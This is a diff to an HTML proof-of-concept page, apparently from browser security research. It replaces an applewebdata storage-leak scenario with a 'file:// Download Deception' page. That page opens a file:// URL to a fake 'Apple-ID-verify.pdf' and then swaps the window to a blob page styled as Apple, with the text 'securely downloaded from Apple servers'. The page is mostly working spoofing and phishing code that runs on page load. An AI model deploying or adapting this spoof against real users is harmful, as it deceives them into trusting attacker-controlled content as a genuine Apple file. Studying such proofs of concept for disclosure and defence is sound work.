@@ -1,36 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Applewebdata Storage Bypass - Scenario 2</title>
+  <title>file:// Download Deception</title>
   <script>
-    async function simulateStorageLeakage() {
-      const html = `
+    function openDeceptiveDownload() {
+      const spoofHTML = `
         <html>
-          <body style='margin:0'>
-            <script>
-              localStorage.setItem('session_token', 'apple-user-1234-secret');
-              document.body.innerHTML = '<h3 style="font-family: -apple-system">Session Stored in LocalStorage</h3>';
-            <\/script>
+          <body style='margin:0;font-family:-apple-system;background:#fff;'>
+            <div style='padding:20px;'>
+              <h2>Opening PDF File...</h2>
+              <p>This document is securely downloaded from Apple servers.</p>
+              <button style='padding:10px;background:#007aff;color:white;width:100%;'>View Document</button>
+            </div>
           </body>
         </html>
       `;
 
-      const blob = new Blob([html], { type: 'text/html' });
+      const blob = new Blob([spoofHTML], { type: 'text/html' });
       const blobURL = URL.createObjectURL(blob);
 
-      const iframe = document.createElement('iframe');
-      iframe.src = blobURL;
-      iframe.style = 'width:100vw;height:100vh;border:none;';
-      iframe.onload = () => {
-        console.log('[✓] Iframe loaded with blob content');
-      };
-      document.body.appendChild(iframe);
-
-      // Simulate fallback to applewebdata scheme
-      history.replaceState({}, '', 'applewebdata://LEAK-UUID/index.html');
+      const win = window.open("file:///Users/victim/Downloads/Apple-ID-verify.pdf", "_blank");
+      setTimeout(() => {
+        if (win) win.location.href = blobURL;
+      }, 500); // Delay allows initial file:// context to register visually
     }
 
-    window.addEventListener('DOMContentLoaded', simulateStorageLeakage);
+    window.onload = openDeceptiveDownload;
   </script>
 </head>
 <body style="margin:0">
